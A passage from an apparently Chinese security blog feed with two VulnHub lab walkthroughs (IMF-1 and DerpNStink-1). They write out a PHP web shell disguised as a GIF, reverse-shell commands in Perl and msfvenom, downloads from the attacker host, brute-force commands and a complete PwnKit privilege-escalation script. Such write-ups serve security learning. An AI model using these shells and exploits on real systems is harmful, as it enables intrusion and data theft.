class="line">Nmap scan report <span class="keyword">for</span> 192.168.204.134</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:64:79:57 (VMware)</span><br></pre></td></tr></table></figure><h3 id="flag2"><a class="header-anchor" href="#flag2">¶</a>flag2</h3><p>网页源码中扒拉发现<code>/contact.php</code>的头中发现有几个base64, 解码发现不行, 后来发现是将他们拼起来再解码</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816115945739.png" alt="image-20240816115945739"></p><p>得到<code>flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;</code>再进行解码可以得到<code>imfadministrator</code></p><p>直接拿到flag2了?再找一下flag1:</p><h3 id="flag1"><a class="header-anchor" href="#flag1">¶</a>flag1</h3><p>在<code>/contact.php</code>源码搜索flag, 发现存在<code>flag1&#123;YWxsdGhlZmlsZXM=&#125;</code>, 进行base64解码后是<code>allthefiles</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816115145675.png" alt="image-20240816115145675"></p><p>访问<code>/imfadministrator</code>发现是一个登录界面, 源码处发现提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I couldn&#x27;t get the SQL working, so I hard-coded the password. It&#x27;s still mad secure through. - Roger </span><br></pre></td></tr></table></figure><p>先找找哪里有用户名, 发现还是<code>/contact.php</code>界面底下有三个邮箱, 前面应该是用户名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rmichaels@imf.local</span><br><span class="line">akeith@imf.local</span><br><span class="line">estone@imf.local</span><br></pre></td></tr></table></figure><p>测试发现是存在用户名<code>rmichaels</code>, 但是密码错误, 跑字典跑半天不说, 还把靶机跑无响应了</p><h3 id="flag3"><a class="header-anchor" href="#flag3">¶</a>flag3</h3><p>再回来看提示, 硬编码似乎是直接将将密码直接写在代码中然后通过函数与输入进行判断, 就赌这个判断函数有问题了</p><blockquote><p>一般存密码方式都是hash值, md5和sha在php中都存在数组和0e绕过, 这里就尝试了数组绕过</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816122922444.png" alt="image-20240816122922444"></p><p>现在使用数组还是0e后无论我输入的是什么甚至为空, 都会返回<code>flag3&#123;Y29udGludWVUT2Ntcw==&#125;</code>, 解码后为<code>continueTOcms</code></p><p>点击超链接访问给的新的网址<code>/imfadministrator/cms.php?pagename=home</code>, 页面完全无交互, 扫不出东西, 尝试对url做文章:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/imfadministrator/cms.php?pagename=home&#x27;</span><br><span class="line">Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29</span><br></pre></td></tr></table></figure><p>可以看到报错而且是mysql数据库, 可能存在sql注入</p><h3 id="flag4"><a class="header-anchor" href="#flag4">¶</a>flag4</h3><blockquote><p>这里把所有可见符号都跑了一遍, 问就是曾经用到过</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://192.168.204.134/imfadministrator/cms.php?pagename=home&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=evaam456bvuqsl21a62i26sun2&quot;</span> <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><p>利用sql爆表可以得到一张图片<code>/imfadministrator/images/whiteboard.jpg</code>, 扫描图片的二维码可以得到<code>flag4&#123;dXBsb2Fkcjk0Mi5waHA=&#125;</code>, 解码后为<code>uploadr942.php</code>, 尝试访问<code>/imfadministrator/uploadr942.php</code>, 发现文件上传</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><h3 id="flag5"><a class="header-anchor" href="#flag5">¶</a>flag5</h3><p>只能上传jpg, gif和png, 过滤eval以及exec</p><p>尝试weevely:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weevely generate cmd muma.gif</span><br></pre></td></tr></table></figure><p>然后利用vim在前面加上gif的文件头GIF89a即可, 应该是可以正常上传的, 在源码中可以找到文件名</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816132639333.png" alt="image-20240816132639333"></p><p>然后寻找文件所在位置, 应该是<code>/imfadministrator/uploads/0473994f47f0.gif</code>, 然后就可以利用weevely连接木马</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weevely http://192.168.204.134/imfadministrator/uploads/0473994f47f0.gif cmd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816132924805.png" alt="image-20240816132924805"></p><blockquote><p>还有一些方法就写在附录了, 其实也是绕过</p></blockquote><p>就在当前目录下有<code>flag5_abc123def.txt</code>, 得到<code>flag5&#123;YWdlbnRzZXJ2aWNlcw==&#125;</code>, 解出来<code>agentservices</code>, 代理服务?寻找一下叫做agent的文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name agent &amp;&gt;1/dev/unll</span><br><span class="line"><span class="comment"># /usr/local/bin/agent</span></span><br><span class="line"><span class="comment"># /etc/xinetd.d/agent</span></span><br></pre></td></tr></table></figure><p>在<code>/usr/local/bin/</code>下的access_code, 提示了端口敲击顺序</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926213617680.png" alt="image-20240926213617680"></p><blockquote><p>Port Knocking(端口敲击), 用于增强安全性, 巧妙地隐蔽端口; 需要一定的敲击顺序才能打开隐藏端口</p><p>能提高系统的安全性, 降低受到自动攻击的风险</p></blockquote><p>我们再来看看哪些端口被占用, 可能的隐藏端口为7788</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -ant</span><br><span class="line"><span class="comment"># 3306, 22, 7788</span></span><br></pre></td></tr></table></figure><p>下载端口敲击工具运行后重新进行端口扫描: <a href="https://github.com/grongor/knock">knock</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./knock -v 192.168.56.11 7482 8279 9467</span><br><span class="line">nmap -A -p 1-10000 192.168.56.11</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927104240519.png" alt="image-20240927104240519"></p><p>尝试nc连接后发现需要输入Agent ID, 我们并没有这个, 将靶机文件下载下来:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.56.11 7788</span><br><span class="line">file_download /usr/local/bin/agent /home/kali/Desktop/</span><br></pre></td></tr></table></figure><p>对agent进行检查(GDB环境), 没有启用栈溢出保护机制, 且<code>No PIE</code>意味着程序装载到内存中的地址固定</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927163151213.png" alt="image-20240927163151213"></p><p>使用ltrace跟踪agent在执行过程中调用库函数的情况</p><p>fget就是获取输入, 随意输入后看到判断由函数strncmp完成对比, 而对比的就是我们要的ID: <code>48093572</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927151905422.png" alt="image-20240927151905422"></p><blockquote><p>也可以用IDA, F5查看逆向后代码</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927164744940.png" alt="image-20240927164744940"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>既然该程序有溢出漏洞, 那就是利用了, 我没学过pwn导致我不清楚怎么做, 那就交给大佬了:</p><p><a href="https://blog.csdn.net/weixin_43938645/article/details/128594803?ops_request_misc=%257B%2522request%255Fid%2522%253A%25225687D4F7-30B2-4167-99D4-B343E7E28B67%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=5687D4F7-30B2-4167-99D4-B343E7E28B67&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128594803-null-null.142%5Ev100%5Epc_search_result_base4&amp;utm_term=IMF-1&amp;spm=1018.2226.3001.4187">渗透项目（八）：IMF-1</a></p><p>或者直接当脚本小子:</p><p>脚本网址: <a href="https://github.com/jessekurrus/agentsploit">https://github.com/jessekurrus/agentsploit</a></p><p>msfvenom创建一个shellcode:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.6 LPORT=6666 -f python -b <span class="string">&quot;\x00\x0a\x0d&quot;</span></span><br><span class="line"><span class="comment"># 避免脚本中有这三个字符</span></span><br></pre></td></tr></table></figure><p>然后将生成的字符串替换脚本中的内容</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927171822546.png" alt="image-20240927171822546"></p><p>然后监听对应端口, 运行脚本即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 6666</span><br><span class="line">python2 agentsploit.py 192.168.56.11 7788</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927172225216.png" alt="image-20240927172225216"></p><p>最后再<code>/root</code>目录下找到了flag6, 解码出来是 Gh0stProt0c0ls</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927172513752.png" alt="image-20240927172513752"></p><p>好了现在让我们来试试其他方式提权:</p><ul><li>权限: www-data</li><li>系统:发布版本: Ubuntu 16.04 LTS内核: 4.4.0-45-generic x86_64</li><li>环境: python3, gcc</li></ul><p>网上一查就能有<a href="https://www.cnblogs.com/SeanGyy/p/15709712.html">Ubuntu 16.04漏洞复现(CVE-2017-16995)</a>, 在kali寻找对应脚本有<code>45010.c</code></p><p>上传上去编译执行就能拿到root权限</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927175304503.png" alt="image-20240927175304503"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><h3 id="关于不使用weevely"><a class="header-anchor" href="#关于不使用weevely">¶</a>关于不使用weevely</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]; <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这个文件可以正常上传, 不过需要再下载木马到靶机进行后续操作</p><blockquote><p>我的建议是先上蚁剑, 不然会有一大堆问题, 比如上传没有权限运行不了但是没有回显</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 12000</span><br><span class="line">http://192.168.56.11/imfadministrator/uploads/05d32e2a9585.gif?cmd=wget http://192.168.56.6:11000/shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927113220913.png" alt="image-20240927113220913"></p><p>不过还有一种方法, 因为靶机安装了python3, 而且有perl, 利用perl反弹shell, <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.56.11&quot;;$p=6677;socket(S,PF_INET,SOCK_STREAM,getproto</span></span><br><span class="line"><span class="string">byname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> Port Knocking </tag>
            
            <tag> 端口敲击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DerpNStink-1</title>
      <link href="/article/DerpNStink-1/"/>
      <url>/article/DerpNStink-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>DerpNStink: 1</h1><hr><p>No.4</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">vulnhub靶场-DerpNStink:1</a></p><p>目标: attack the VM and find all 4 flags eventually leading you to full root access</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.6</li><li>ubuntu: 192.168.56.10</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.10</span><br><span class="line">nmap -sC -sV -p- -v -A 192.168.56.10</span><br></pre></td></tr></table></figure><p>结合工具以及访问网页, 可以收集一些信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 端口: </span></span><br><span class="line">21,22,80,3306</span><br><span class="line"><span class="comment"># 中间件: </span></span><br><span class="line">apache/2.4.7</span><br><span class="line">MySQL</span><br><span class="line">jQuery</span><br><span class="line">PHP</span><br><span class="line"><span class="comment"># 操作系统: </span></span><br><span class="line">Ubuntu 2ubuntu2.8</span><br><span class="line"><span class="comment"># cms: </span></span><br><span class="line">WordPres</span><br></pre></td></tr></table></figure><p>直接访问80端口, 可以在网页中搜索找到flag1, 还找到一个<code>/webnotes/info.txt</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240924204439528.png" alt="image-20240924204439528"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --&gt; </span><br><span class="line"># 需要修改host文件</span><br></pre></td></tr></table></figure><p>WordPress后台有弱密码, 账号密码均为<code>admin</code></p><p>先配置hosts文件, 你问我网址怎么来的, 我说windows登录后得到的, 或者linux访问<code>/weblog/wp-admin</code>得到的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.56.10    derpnstink.local</span><br></pre></td></tr></table></figure><p>进行目录扫描:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/php/phpmyadmin</span><br><span class="line">/robots.txt</span><br><span class="line">/temporary/        # 仅仅输出try harder</span><br><span class="line">/weblog</span><br><span class="line">/weblog/wp-admin</span><br><span class="line">/webnotes</span><br></pre></td></tr></table></figure><p>利用漏洞扫描工具进一步扫描(kali自带的wpscan), 搜索漏洞:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://derpnstink.local/weblog/</span><br><span class="line"><span class="comment"># 找到过时插件: slideshow-gallery 1.4.8</span></span><br><span class="line"><span class="comment"># 有cms主题 twentysixteen</span></span><br><span class="line"></span><br><span class="line">search WordPress 4.6</span><br><span class="line"><span class="comment"># 这不一眼看到slideshowgallery_upload</span></span><br><span class="line"><span class="comment"># 我没有在搜索引擎找到对应的编号</span></span><br></pre></td></tr></table></figure><blockquote><p>搜索方式不对导致的, 应该搜索这个: wordpress slideshow exploit</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925193308091.png" alt="image-20240925193308091"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_slideshowgallery_upload</span><br><span class="line">set rhosts 192.168.56.10</span><br><span class="line">set targeturi /weblog</span><br><span class="line">set wp_password admin</span><br><span class="line">set wp_user admin</span><br><span class="line"># 记得看 lhost 是否正确, 下图就是因为没有设置 lhost 上传了一堆</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925194854979.png" alt="image-20240925194854979"></p><p>继续信息收集:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户 whoami</span></span><br><span class="line">www-data</span><br><span class="line"><span class="comment"># 系统内核 uname -a </span></span><br><span class="line">Linux DeRPnStiNK 4.4.0-31-generic <span class="comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="comment"># 环境</span></span><br><span class="line">gcc</span><br><span class="line"><span class="comment"># 配置文件 /var/www/html/weblog/wp-config.php</span></span><br><span class="line">mysql账密: root mysql</span><br><span class="line">库名: wordpress</span><br></pre></td></tr></table></figure><blockquote><p><code>lsb_release -a</code> 查看发行版本</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看有suid权限的文件</p></blockquote><p>进入mysql收集信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use wordpress</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure><p>可以找到最后一列是flag2, 但是没有值, 猜测是另一个账号登录获取flag2</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925200926303.png" alt="image-20240925200926303"></p><p>结果在<code>wp_posts</code>数据库中找到了flag2, 那挺好的</p><blockquote><p>爆破密钥的话可以利用kali的<code>john</code>工具, 将要爆破的写进pass.txt进行爆破; rockyou.txt可以去到这个目录下解压<code>rockyou.txt.gz</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># unclestinky/wedgie57  登录wordpress获得flag2</span></span><br></pre></td></tr></table></figure></blockquote><p>现在只剩下21和22没有试过了, 但是发现登录需要账号密码</p><p>获取用户名可以<code>cat /etc/passwd</code>, 也可以前往<code>/home</code>查看有谁的配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户: mrderp, stinky</span></span><br><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.10 ftp</span><br><span class="line"><span class="comment"># 爆破拿到ftp账密: stinky wedgie57</span></span><br></pre></td></tr></table></figure><blockquote><p>发现这一套账号密码也可以直接用于<code>su stinky</code></p><p>主要是我在ftp里面找不到东西</p></blockquote><p>利用<code>su stinky</code>登录对应账号, 在此权限下进入<code>/home/stinky/Desktop</code>找到flag.txt, 这是flag3</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925205624768.png" alt="image-20240925205624768"></p><p>三个都找到了, 结合靶机描述, 下一步我们应该提权</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><blockquote><p>耗时最久的一集</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 14.04, 测试半天没有任何收获</span><br></pre></td></tr></table></figure><p>遂用搜索引擎寻找新的方法: <a href="https://942178v2gb.k.topthink.com/@k7pl99lypy/Ubuntuneihetiquan.html">Ubuntu内核提权-Xe的库</a></p><p>已经测试的: <code>CVE-2017-16995</code>(45010.c), <code>CVE-2021-3493</code>(37292.c)</p><p>2021这么新都不行, 向后找<a href="http://1.13.190.198/2022/04/07/CVE-2021-4034/">CVE-2021-4034：Linux Polkit 权限提升漏洞复现以及修复</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.6:6789/cve-2021-4034.c</span><br><span class="line"><span class="built_in">chmod</span> 777 cve-2021-4034.c</span><br><span class="line">gcc cve-2021-4034.c -o poc</span><br><span class="line"><span class="built_in">chmod</span> 777 poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145559032.png" alt="image-20240926145559032"></p><p>然后进入<code>/root</code>, 在Desktop下找到flag4, 圆满完成任务</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145704769.png" alt="image-20240926145704769"></p><h2 id="其他提权"><a class="header-anchor" href="#其他提权">¶</a>其他提权</h2><h3 id="内核提权"><a class="header-anchor" href="#内核提权">¶</a>内核提权</h3><p>内核版本为4.4.0, 该内核受脏牛漏洞影响, 后面不必多说</p><h3 id="非内核提权"><a class="header-anchor" href="#非内核提权">¶</a>非内核提权</h3><p>从Wordpress的配置文件wp-config中可以获取到数据库账密: <code>root:mysql</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看wordpress保存的用户</span><br><span class="line">select * from wp_users;</span><br><span class="line"># 有一个unclestinky令人在意</span><br><span class="line">select user_login,user_pass from wp_users;</span><br></pre></td></tr></table></figure><p>在<code>/etc/passwd</code>中存在一个用户stinky, 该命名相似度, 可以尝试破解这个密码并登录</p><p>将密码保存为key文件, 利用john进行爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john key -w=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到密码为<code>wedgie57</code>. 切换用户为stinky, 在用户的Documents目录下存在<code>derpissues.pcap</code>流量包, 进行流量分析</p><p>传递文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali:</span></span><br><span class="line">nc -lvvp 1234 &gt; derpissues.pcap</span><br><span class="line"><span class="comment"># 靶机:</span></span><br><span class="line">nc -nv 192.168.56.6 1234 &lt; derpissues.pcap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926152420545.png" alt="image-20240926152420545"></p><p>分析文件, 在http过滤器下找到No.5598数据包(POST, 而且是创建新用户)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wireshark derpissues.pcap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926155413165.png" alt="image-20240926155413165"></p><p>尝试用这个密码去登录用户, 成功登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mrderp@192.168.56.10</span><br><span class="line">derpderpderpderpderpderpderp</span><br></pre></td></tr></table></figure><p>执行<code>sudo -l</code>, 发现可以执行特定路径下有sudo权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mrderp ALL=(ALL) /home/mrderp/binaries/derpy*</span><br></pre></td></tr></table></figure><p>也就是允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/目录下derpy开头的文件</p><p>没有这个目录就去创建这个目录, 可以获取root权限; 或者可以弹个root权限的shell出去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> binaries</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; derpy.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 derpy.sh</span><br><span class="line">sudo ./derpy.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926183631782.png" alt="image-20240926183631782"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>去找了其他大佬的博客, 我们似乎用不同的方法跳过了不少步骤</p><h3 id="ftp中有公钥文件"><a class="header-anchor" href="#ftp中有公钥文件">¶</a>ftp中有公钥文件</h3><p>在<code>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</code>下有一个key.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get key.txt    # 下载到本地</span><br></pre></td></tr></table></figure><p>利用这个密钥可以登录前面找到的两个账户</p><p>如果出现<code>Permissions 0664 for 'key.txt' are too open</code>, 就把权限设为400</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 400 key.txt   <span class="comment"># -rwx</span></span><br><span class="line">ssh -i key.txt stinky@192.168.159.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa</span><br><span class="line"><span class="comment"># 此处两个我都无法登录</span></span><br></pre></td></tr></table></figure><h3 id="ftp中还有聊天文件"><a class="header-anchor" href="#ftp中还有聊天文件">¶</a>ftp中还有聊天文件</h3><p><code>/files/network-logs/</code>下还有<code>derpissues.txt</code></p><p>在这里可以看到通过数据包捕获工具进行问题排查, 那就是排查我们的到的那个数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?</span><br><span class="line">12:07 stinky: yeah. did you need a password reset?</span><br><span class="line">12:07 mrderp: I think i accidently deleted my account</span><br><span class="line">12:07 mrderp: i just need to logon once to make a change</span><br><span class="line">12:07 stinky: im gonna packet capture so we can figure out whats going on</span><br><span class="line">12:07 mrderp: that seems a bit overkill, but wtv</span><br><span class="line">12:08 stinky: commence the sniffer!!!</span><br><span class="line">12:08 mrderp: -_-</span><br><span class="line">12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?</span><br><span class="line">12:11 mrderp: awesome it works!</span><br><span class="line">12:12 stinky: we really are the best sysadmins #team</span><br><span class="line">12:13 mrderp: i guess we are…</span><br><span class="line">12:15 mrderp: alright I made the changes, feel free to decomission my account</span><br><span class="line">12:20 stinky: done! yay</span><br></pre></td></tr></table></figure><h3 id="mrderp的Desktop下有提权方式"><a class="header-anchor" href="#mrderp的Desktop下有提权方式">¶</a>mrderp的Desktop下有提权方式</h3><p>有一个<code>helpdesk.log</code>, 里面有提示:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926160236163.png" alt="image-20240926160236163"></p><p>这个网址在访问后有一句话:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mrderp ALL=(ALL) /home/mrderp/binaries/derpy*</span><br></pre></td></tr></table></figure><h3 id="扒拉过来的py提权文件"><a class="header-anchor" href="#扒拉过来的py提权文件">¶</a>扒拉过来的py提权文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#  CVE-2021-4034</span></span><br><span class="line"><span class="comment">#  Ravindu Wickramasinghe (@rvizx9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"></span><br><span class="line">so=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void gconv() &#123;&#125;</span></span><br><span class="line"><span class="string">void gconv_init() &#123;</span></span><br><span class="line"><span class="string">    setuid(0);setgid(0);seteuid(0);setegid(0);</span></span><br><span class="line"><span class="string">    system(&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh&quot;);</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    os.system(<span class="string">&quot;mkdir -p &#x27;GCONV_PATH=.&#x27; pwnkit ; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;</span>)</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&quot;pwnkit/pwnkit.c&quot;</span>,<span class="string">&quot;w&quot;</span>) ; f.write(so) ;f.close()</span><br><span class="line">    os.system(<span class="string">&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;</span>)</span><br><span class="line">    envi=[<span class="string">b&quot;pwnkit&quot;</span>, <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<span class="string">b&quot;CHARSET=PWNKIT&quot;</span>,<span class="string">b&quot;SHELL=pwnkit&quot;</span>,<span class="literal">None</span>]</span><br><span class="line">    env=(c_char_p * <span class="built_in">len</span>(envi))() ;env[:]=envi</span><br><span class="line">    libc = CDLL(find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">    libc.execve(<span class="string">b&#x27;/usr/bin/pkexec&#x27;</span>,c_char_p(<span class="literal">None</span>) ,env)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="收集笔记"><a class="header-anchor" href="#收集笔记">¶</a>收集笔记</h3><ul><li><p>ip:192.168.56.10</p></li><li><p>域名: derpnstink.local</p></li><li><p>网站信息/路径:</p><p>wordpress</p><p>/weblog/wp-admin</p><p>/php/phpmyadmin</p></li><li><p>账密:ssh/su:  mrderp / derpderpderpderpderpderpderpftp/su: stinky / wedgie57</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
